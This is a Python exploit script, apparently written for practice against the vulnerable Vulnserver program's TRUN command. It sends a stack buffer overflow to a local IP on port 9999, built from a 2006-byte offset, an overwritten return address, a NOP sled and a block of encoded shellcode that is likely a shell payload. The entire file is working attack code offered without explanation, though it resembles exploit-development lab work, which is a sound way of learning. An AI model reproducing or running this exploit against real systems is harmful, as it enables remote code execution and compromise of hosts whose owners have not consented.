#!/usr/bin/python
import socket
shellcode =  b""
shellcode += b"\xbf\xd3\x1c\xcd\x30\xdb\xd5\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x52\x31\x7e\x12\x83\xee\xfc"
shellcode += b"\x03\xad\x12\x2f\xc5\xad\xc3\x2d\x26\x4d\x14"
shellcode += b"\x52\xae\xa8\x25\x52\xd4\xb9\x16\x62\x9e\xef"
shellcode += b"\x9a\x09\xf2\x1b\x28\x7f\xdb\x2c\x99\xca\x3d"
shellcode += b"\x03\x1a\x66\x7d\x02\x98\x75\x52\xe4\xa1\xb5"
shellcode += b"\xa7\xe5\xe6\xa8\x4a\xb7\xbf\xa7\xf9\x27\xcb"
shellcode += b"\xf2\xc1\xcc\x87\x13\x42\x31\x5f\x15\x63\xe4"
shellcode += b"\xeb\x4c\xa3\x07\x3f\xe5\xea\x1f\x5c\xc0\xa5"
shellcode += b"\x94\x96\xbe\x37\x7c\xe7\x3f\x9b\x41\xc7\xcd"
shellcode += b"\xe5\x86\xe0\x2d\x90\xfe\x12\xd3\xa3\xc5\x69"
shellcode += b"\x0f\x21\xdd\xca\xc4\x91\x39\xea\x09\x47\xca"
shellcode += b"\xe0\xe6\x03\x94\xe4\xf9\xc0\xaf\x11\x71\xe7"
shellcode += b"\x7f\x90\xc1\xcc\x5b\xf8\x92\x6d\xfa\xa4\x75"
shellcode += b"\x91\x1c\x07\x29\x37\x57\xaa\x3e\x4a\x3a\xa3"
shellcode += b"\xf3\x67\xc4\x33\x9c\xf0\xb7\x01\x03\xab\x5f"
shellcode += b"\x2a\xcc\x75\x98\x4d\xe7\xc2\x36\xb0\x08\x33"
shellcode += b"\x1f\x77\x5c\x63\x37\x5e\xdd\xe8\xc7\x5f\x08"
shellcode += b"\xbe\x97\xcf\xe3\x7f\x47\xb0\x53\xe8\x8d\x3f"
shellcode += b"\x8b\x08\xae\x95\xa4\xa3\x55\x7e\x0b\x9b\x4a"
shellcode += b"\xfc\xe3\xde\x74\x23\xdd\x57\x92\x49\x0d\x3e"
shellcode += b"\x0d\xe6\xb4\x1b\xc5\x97\x39\xb6\xa0\x98\xb2"
shellcode += b"\x35\x55\x56\x33\x33\x45\x0f\xb3\x0e\x37\x86"
shellcode += b"\xcc\xa4\x5f\x44\x5e\x23\x9f\x03\x43\xfc\xc8"
shellcode += b"\x44\xb5\xf5\x9c\x78\xec\xaf\x82\x80\x68\x97"
shellcode += b"\x06\x5f\x49\x16\x87\x12\xf5\x3c\x97\xea\xf6"
shellcode += b"\x78\xc3\xa2\xa0\xd6\xbd\x04\x1b\x99\x17\xdf"
shellcode += b"\xf0\x73\xff\xa6\x3a\x44\x79\xa7\x16\x32\x65"
shellcode += b"\x16\xcf\x03\x9a\x97\x87\x83\xe3\xc5\x37\x6b"
shellcode += b"\x3e\x4e\x57\x8e\xea\xbb\xf0\x17\x7f\x06\x9d"
shellcode += b"\xa7\xaa\x45\x98\x2b\x5e\x36\x5f\x33\x2b\x33"
shellcode += b"\x1b\xf3\xc0\x49\x34\x96\xe6\xfe\x35\xb3"
try:
  print "[+] \nSending evil buffer..."
  trun = "TRUN ."
  offset = "A" * 2006
  eip = "\xaf\x11\x50\x62"
  nops = "\x90" * 10
  buffer = trun + offset + eip + nops + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.0.106", 9999))
  s.send(buffer)
  
  s.close()
 
  print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
  print "\n[+] Sending buffer: " + buffer
  print "\n[+] Done!"
  
except:
  print "\n[+] Could not connect!"
